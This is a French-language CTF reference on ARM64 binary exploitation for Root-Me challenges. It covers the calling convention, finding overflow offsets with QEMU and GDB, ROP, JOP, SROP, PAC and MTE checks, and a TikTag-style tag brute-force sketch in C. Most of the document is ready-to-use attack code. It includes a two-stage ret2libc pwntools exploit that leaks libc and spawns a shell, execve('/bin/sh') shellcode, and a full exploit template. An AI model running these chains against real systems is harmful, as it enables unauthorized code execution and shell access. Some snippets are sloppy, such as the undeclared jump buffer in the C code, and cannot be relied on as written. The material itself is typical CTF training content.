# CTF App-System — ELF ARM64 / AArch64

## Spécificités ARM64 critiques

### Convention d'appel ARM64 (AAPCS64)

```
Registres arguments :   x0, x1, x2, x3, x4, x5, x6, x7
Valeur de retour :      x0 (x0:x1 pour 128-bit)
Link Register :         x30 (LR) — adresse de retour
Frame Pointer :         x29 (FP)
Stack Pointer :         sp (aligné à 16 bytes OBLIGATOIRE)
Scratch registers :     x8-x18 (caller-saved)
Preserved registers :   x19-x28, x29, x30 (callee-saved)
```

**DIFFÉRENCE MAJEURE** : Le `ret` en ARM64 saute vers `x30 (LR)`, pas vers la pile.
L'adresse de retour est souvent sauvegardée sur la pile par le prologue.

### Prologue/Epilogue ARM64 typiques

```asm
; Prologue : sauvegarde LR et FP
stp x29, x30, [sp, #-0x20]!   ; push {fp, lr}; sp -= 0x20
mov x29, sp

; Corps de la fonction
...

; Epilogue : restaure et retourne
ldp x29, x30, [sp], #0x20     ; pop {fp, lr}; sp += 0x20
ret                             ; jump to x30

; Si overflow du buffer : overwrite x30 (LR) sauvegardé sur la pile
```

### Layout pile ARM64

```
[ local vars ]  ← sp (aligné 16)
[ x29 (FP)  ]  ← sp + buffer_size
[ x30 (LR)  ]  ← sp + buffer_size + 8  ← TARGET (overwrite return addr)
```

**Offset** = taille_buffer → overwrite x30 (pas de "saved rbp" séparé comme x86)

## Trouver l'offset ARM64

```bash
# GDB avec pwndbg en local (QEMU + ARM64 chroot ou machine ARM)
# Ou cross-compiler pour test

# Méthode 1 : cyclic + crash
python3 -c "from pwn import *; context.arch='aarch64'; sys.stdout.buffer.write(cyclic(200))" \
  | ./challenge
# Dans gdb-multiarch : info registers x30 → valeur corrompue

# Méthode 2 : QEMU user-mode
qemu-aarch64 -g 1234 ./challenge &
gdb-multiarch -ex "set arch aarch64" -ex "target remote :1234" ./challenge

# Méthode 3 : static analysis
objdump -d ./challenge | grep -A3 "sub.*sp"
# Chercher : stp x29, x30, [sp, #-N]!
# → offset = N - 0 (x30 est à sp+8 après le stp)
# → payload = b'A'*N + p64(target_addr)  → overwrite x30
```

## Test local ARM64 avec QEMU

```bash
# Installation
sudo apt install qemu-user-static gcc-aarch64-linux-gnu gdb-multiarch

# Exécuter un binaire ARM64 directement (avec libc ARM64)
qemu-aarch64-static -L /usr/aarch64-linux-gnu ./challenge

# Debug avec GDB
qemu-aarch64-static -g 1234 -L /usr/aarch64-linux-gnu ./challenge &
gdb-multiarch ./challenge -ex "target remote :1234"

# pwntools avec QEMU automatique
from pwn import *
context.arch = 'aarch64'
context.os = 'linux'
io = process(['qemu-aarch64-static', '-L', '/usr/aarch64-linux-gnu', './challenge'])
```

## ROP ARM64 : rareté des gadgets

**Problème** : ARM64 a des instructions de taille fixe (4 bytes), ce qui limite drastiquement les gadgets par rapport à x86. Les gadgets `ret` sont rares car ARM64 utilise `br x30` ou `ret`.

```bash
# Trouver les gadgets ARM64
ROPgadget --binary ./challenge --rop --arch aarch64
# Ou ropper
ropper -f ./challenge --arch AARCH64

# Gadgets essentiels à chercher
# ldr x0, [sp, #N]; ldp x29, x30, [sp, #M]; ret  ← charger x0 depuis pile
# blr x0  ← call indirect via registre (JOP)
# ldp xN, xM, [sp, #N]!; ret  ← pop multiple registers
```

## JOP (Jump-Oriented Programming) ARM64

**JOP** = alternative à ROP sur ARM64 quand `ret` gadgets manquent. Utilise `br xN` ou `blr xN` (call via registre) pour chaîner les gadgets.

```python
# Schéma JOP typique :
# Gadget dispatcher : charge xN depuis la pile → br xN
# Chaque gadget : effectue action → charge prochain gadget → br xN

# Exemple avec gadget "ldr x0, [x1]; br x2"
# x1 = adresse de la valeur à charger dans x0
# x2 = adresse du prochain gadget
```

## ret2libc ARM64

```python
from pwn import *

context.arch = 'aarch64'
elf  = ELF('./challenge')
libc = ELF('./libc.so.6')  # libc ARM64

# Gadgets ARM64 (trouver avec ROPgadget)
# Chercher : "ldr x0, [sp, ...]; ... ret" ou "ldp x0, ...; ret"
pop_x0 = ...  # gadget qui met [sp+N] dans x0 puis ret

offset = 72  # à ajuster

# === Stage 1 : Leak puts@GOT ===
payload  = b'A' * offset
# ARM64 : x0 = arg1 → mettre puts@GOT dans x0
payload += p64(pop_x0)
payload += p64(elf.got['puts'])  # valeur pour x0
payload += p64(elf.plt['puts'])  # call puts
payload += p64(elf.symbols['main'])  # retour

io.sendline(payload)
puts_leak = u64(io.recvn(8))
libc_base = puts_leak - libc.symbols['puts']
system    = libc_base + libc.symbols['system']
binsh     = libc_base + next(libc.search(b'/bin/sh'))

# === Stage 2 : system("/bin/sh") ===
payload2  = b'A' * offset
payload2 += p64(pop_x0) + p64(binsh)
payload2 += p64(system)

io.sendline(payload2)
io.interactive()
```

## Shellcode ARM64

```python
from pwn import *
context.arch = 'aarch64'

# Shellcode execve("/bin/sh", NULL, NULL)
shellcode = asm(shellcraft.aarch64.linux.sh())

# Ou shellcode manuel ARM64
shellcode = asm('''
    /* execve("/bin/sh", NULL, NULL) */
    mov x8, #221              /* __NR_execve = 221 */
    adr x0, binsh
    mov x1, #0
    mov x2, #0
    svc #0
    binsh: .asciz "/bin/sh"
''')
```

## Pointer Authentication (PAC) bypass

```bash
# PAC = Pointer Authentication Codes
# Présent sur hardware Apple M1/M2, certains serveurs ARM modernes
# Root-Me challenges : généralement pas de PAC (émulé sous QEMU sans PAC)

# Vérifier si PAC est actif
# Dans le binaire : chercher "pacibsp", "autibsp", "pacia", "autia"
objdump -d ./challenge | grep -E "pac|aut"

# Si QEMU sans PAC extension : les instructions PAC sont NOP → exploit normal
# Si PAC actif : besoin d'oracle pour signer les pointeurs

# Pour Root-Me : vérifier le flag dans qemu-aarch64-static
qemu-aarch64-static -cpu max ./challenge
# "max" inclut toutes les extensions mais émule sans vrai PAC enforcement
```

## Gadgets ARM64 courants dans libc

```bash
# Chercher dans libc ARM64 (souvent plus de gadgets)
ROPgadget --binary ./libc.so.6 --rop --arch aarch64 | grep "pop {x0}"
ropper -f ./libc.so.6 --arch AARCH64 | grep "ldr x0"

# Gadgets typiquement trouvables dans libc ARM64
# ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret
# → Parfait pour charger x0 (arg1) depuis la pile
```

## Numéros de syscalls ARM64

```
__NR_read        = 63
__NR_write       = 64
__NR_openat      = 56
__NR_close       = 57
__NR_execve      = 221
__NR_exit        = 93
__NR_mmap        = 222
__NR_mprotect    = 226
__NR_brk         = 214
__NR_rt_sigreturn = 139
```

```python
# Syscall en ARM64
payload = asm('''
    mov x8, 221     ; __NR_execve
    adr x0, sh_str
    mov x1, xzr
    mov x2, xzr
    svc 0
    sh_str: .ascii "/bin/sh\x00"
''')
```

## TikTag — MTE Bypass via Speculative Execution (2024)

**Source :** [github.com/compsec-snu/tiktag](https://github.com/compsec-snu/tiktag) | IEEE S&P 2025  
**Impact :** Bypass hardware Memory Tagging Extension (MTE) via branch predictor / store-to-load forwarding  
**Contexte CTF :** Challenges ARM64 avec MTE activé (Pixel 8, serveurs modernes)

```bash
# Vérifier si MTE est actif dans le challenge
objdump -d ./challenge | grep -E "stg|ldg|irg|addg|subg|gmi"
# stg = store tag, ldg = load tag, irg = insert random tag

# Si MTE présent dans QEMU :
qemu-aarch64-static -cpu max,mte=on ./challenge

# TikTag-v1 : branch predictor side-channel
# Mesurer le temps d'accès après une prédiction de branche
# Un accès avec le mauvais tag cause une exception → timing différent

# TikTag-v2 : store-to-load forwarding
# CPU forward depuis un store avec tag invalide vers un load → leak du tag
# Les deux variantes ont 95%+ de succès sur Pixel 8 hardware
```

```c
// Concept TikTag (simplifié pour CTF)
// Pour chaque tag possible (0-15), tenter un accès et mesurer le timing
// Le bon tag cause un hit, les mauvais causent des exceptions (plus lents)

#include <time.h>
#include <signal.h>

volatile int tag_found = 0;
volatile uint8_t correct_tag = 0;

void sigsegv_handler(int sig) {
    // Exception MTE → mauvais tag, continuer
    longjmp(env, 1);
}

uint8_t leak_mte_tag(void *tagged_ptr) {
    signal(SIGSEGV, sigsegv_handler);
    
    for (uint8_t tag = 0; tag < 16; tag++) {
        // Forger un pointeur avec le tag testé
        void *test_ptr = (void*)((uintptr_t)tagged_ptr | ((uintptr_t)tag << 56));
        
        if (setjmp(env) == 0) {
            struct timespec start, end;
            clock_gettime(CLOCK_MONOTONIC, &start);
            volatile char val = *(char*)test_ptr;  // Accès MTE
            clock_gettime(CLOCK_MONOTONIC, &end);
            
            uint64_t elapsed = (end.tv_nsec - start.tv_nsec);
            if (elapsed < THRESHOLD_NS) {
                return tag;  // Hit → bon tag
            }
        }
        // Exception → mauvais tag, essayer le suivant
    }
    return 0;  // Pas trouvé
}
```

**Pour Root-Me ARM64 avec MTE :**
- La plupart des challenges Root-Me **n'ont pas MTE** (QEMU sans MTE par défaut)
- Vérifier : `cat /proc/cpuinfo | grep mte` sur le serveur
- Si MTE absent → exploit normal sans tag bruteforce

## SROP (Sigreturn-Oriented Programming) ARM64

```python
from pwn import *
context.arch = 'aarch64'

# SROP ARM64 : moins courant qu'en x86 mais possible
# Gadget nécessaire : mov x8, #139 (rt_sigreturn); svc 0
# x8 = 139 = __NR_rt_sigreturn pour ARM64

# Trouver le gadget rt_sigreturn
# Souvent dans la libc ou dans le binaire

# Construire le SigreturnFrame
frame = SigreturnFrame(arch='aarch64')
frame.x0 = 0               # arg1 pour execve
frame.x8 = 221             # __NR_execve
frame.sp = binsh_addr      # pas utilisé ici
frame.pc = syscall_gadget  # adresse d'une instruction svc #0

# Le payload déclenche sigreturn avec notre frame
payload = b'A' * offset
payload += p64(sigreturn_gadget)  # mov x8, 139; svc 0
payload += bytes(frame)
```

## Debugging ARM64 remote (Root-Me SSH)

```bash
# Sur le serveur Root-Me ARM64 :
# 1. Vérifier l'architecture
file ./challenge   # → ELF 64-bit LSB executable, ARM aarch64

# 2. Vérifier les tools disponibles
which gdb          # rarement présent
which python3      # souvent présent

# 3. QEMU peut être utilisé localement pour debug
# Télécharger le binaire
scp -P 2222 user@host:~/challenge ./

# 4. Tester avec la bonne libc
scp -P 2222 user@host:/lib/aarch64-linux-gnu/libc.so.6 ./libc_arm64.so.6
qemu-aarch64-static -L /usr/aarch64-linux-gnu ./challenge
# Ou avec patchelf
```

## Template exploit ARM64 complet

```python
from pwn import *

context.arch = 'aarch64'
context.os = 'linux'
context.log_level = 'info'

elf  = ELF('./challenge')
libc = ELF('./libc_arm64.so.6')
rop  = ROP(elf)

LOCAL = True
if LOCAL:
    io = process(['qemu-aarch64-static', '-L', '/usr/aarch64-linux-gnu', './challenge'])
else:
    shell = ssh('user', 'challenge.root-me.org', port=2222, password='...')
    io = shell.process('./challenge')

offset = 72  # À déterminer avec cyclic

# Gadgets
# Chercher avec ROPgadget --binary ./challenge --binary ./libc_arm64.so.6
pop_x0 = 0x...  # ldr x0, ...; ret ou équivalent

# Exploit
payload = flat([
    b'A' * offset,
    pop_x0,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main'],
])

io.sendlineafter(b'> ', payload)
leak = u64(io.recvn(8))
libc.address = leak - libc.sym['puts']

system = libc.sym['system']
binsh  = next(libc.search(b'/bin/sh'))

payload2 = flat([
    b'A' * offset,
    pop_x0,
    binsh,
    system,
])
io.sendlineafter(b'> ', payload2)
io.interactive()
```
